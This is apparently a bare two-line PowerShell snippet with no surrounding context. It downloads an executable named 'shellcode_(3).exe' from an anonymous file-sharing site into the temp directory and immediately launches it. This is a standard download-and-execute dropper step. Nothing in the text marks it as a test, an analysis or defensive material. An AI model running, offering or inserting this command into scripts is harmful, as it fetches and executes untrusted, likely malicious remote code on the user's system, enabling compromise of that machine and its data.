Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
Start-Process -FilePath "$temp\s.exe"
